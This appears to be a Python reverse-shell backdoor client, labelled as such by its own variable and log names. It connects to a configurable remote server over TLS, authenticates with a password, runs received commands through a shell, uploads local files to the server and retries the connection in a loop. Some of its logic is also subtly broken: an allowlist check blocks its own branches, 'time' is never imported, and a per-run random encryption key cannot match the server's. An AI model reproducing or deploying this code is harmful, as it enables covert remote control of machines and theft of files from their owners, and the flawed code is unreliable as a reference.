import socket
import json
import subprocess
import os
import sys
import ssl
import logging
import threading
from cryptography.fernet import Fernet
import hashlib
import os
from queue import Queue

# Load environment variables
import os

SERVER_IP = os.getenv("SERVER_IP", "127.0.0.1")  # Default to localhost for testing
SERVER_PORT = int(os.getenv("SERVER_PORT", 5555))  # Default port
PASSWORD = os.getenv("BACKDOOR_PASSWORD", "your_secure_password")  # Use environment variable

# Configure logging
logging.basicConfig(filename='reverse_shell.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Encryption
ENCRYPTION_KEY = Fernet.generate_key()  # Save this securely
cipher = Fernet(ENCRYPTION_KEY)

BUFFER_SIZE = 4096
ALLOWED_COMMANDS = {'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help'}
command_history = []

def hash_file(filepath):
    """Generate SHA256 hash of a file."""
    hasher = hashlib.sha256()
    with open(filepath, 'rb') as f:
        while chunk := f.read(8192):
            hasher.update(chunk)
    return hasher.hexdigest()

def reliable_send(data):
    """Send encrypted data to the server."""
    try:
        json_data = json.dumps(data)
        encrypted_data = cipher.encrypt(json_data.encode())
        target_sock.send(encrypted_data)
    except Exception as e:
        logging.error(f"Error sending data: {e}")

def reliable_recv():
    """Receive encrypted data from the server."""
    data = b''
    while True:
        try:
            packet = target_sock.recv(BUFFER_SIZE)
            if not packet:
                break
            data += packet
            decrypted_data = cipher.decrypt(data)
            return json.loads(decrypted_data.decode('utf-8'))
        except json.JSONDecodeError:
            continue
        except Exception as e:
            logging.error(f"Error receiving data: {e}")
            break

def authenticate():
    """Authenticate the session before any commands are executed."""
    try:
        attempt = reliable_recv()
        if attempt != PASSWORD:
            reliable_send("Authentication Failed")
            logging.warning("Authentication failed. Closing connection.")
            target_sock.close()
            sys.exit()
        else:
            reliable_send("Authentication Successful")
            logging.info("Authentication successful.")
    except Exception as e:
        logging.error(f"Authentication error: {e}")
        sys.exit(1)

def add_to_history(command):
    """Add executed command to history."""
    command_history.append(command)
    if len(command_history) > 100:  # Limit history length
        command_history.pop(0)

def clear_history():
    """Clear the command history."""
    command_history.clear()
    reliable_send("Command history cleared.")
    logging.info("Command history cleared.")

def list_history():
    """List the executed command history."""
    return command_history if command_history else "No commands have been executed yet."

def execute_command(command):
    """Execute a command and return its output."""
    if command not in ALLOWED_COMMANDS:
        response = f"Command '{command}' is not allowed."
        reliable_send(response)
        return

    if command.startswith('cd '):
        try:
            os.chdir(command[3:])
            response = f"Changed directory to {command[3:]}"
            add_to_history(command)
            reliable_send(response)
        except FileNotFoundError as e:
            reliable_send(f"cd error: {e}")
        return

    if command.startswith("upload "):
        upload_file(command[7:])
        return
    elif command.startswith("download "):
        download_file(command[9:])
        return
    elif command == "history":
        response = list_history()
        reliable_send("\n".join(response))
        return
    elif command == "clear_history":
        clear_history()
        return
    else:
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            reliable_send(output.decode())
            add_to_history(command)
            logging.info(f"Executed command: {command}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Command execution error: {e}")

def upload_file(filename):
    """Upload a file to the server."""
    try:
        with open(filename, 'rb') as file:
            data = file.read()
            reliable_send({"filename": filename, "data": data, "hash": hash_file(filename)})
        logging.info(f"Uploaded file: {filename}")
    except Exception as e:
        logging.error(f"Error uploading file {filename}: {e}")

def download_file(filename):
    """Download a file from the server."""
    try:
        response = reliable_recv()
        with open(filename, 'wb') as file:
            file.write(response["data"])
        logging.info(f"Downloaded file: {filename}")
    except Exception as e:
        logging.error(f"Error downloading file {filename}: {e}")

def display_help():
    """Provide a list of available commands."""
    help_text = """
    Available commands:
    cd [directory]: Change directory
    upload [file]: Upload a file to the server
    download [file]: Download a file from the server
    clear: Clear the shell
    quit: Exit the shell
    help: Display this help information
    history: List executed commands
    clear_history: Clear command history
    """
    reliable_send(help_text)

def establish_connection():
    """Establish connection with the server and handle commands."""
    while True:
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            authenticate()
            logging.info("Connection established with server.")
            while True:
                command = reliable_recv()
                if command == 'quit':
                    logging.info("Shell terminated by server command.")
                    break
                elif command == 'help':
                    display_help()
                else:
                    execute_command(command)
        except Exception as e:
            logging.error(f"Connection error: {e}")
            time.sleep(5)  # Wait before retrying

# SSL Configuration
try:
    context = ssl.create_default_context()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        target_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
        establish_connection()
except Exception as e:
    logging.error(f"SSL Connection error: {e}")
    sys.exit(1)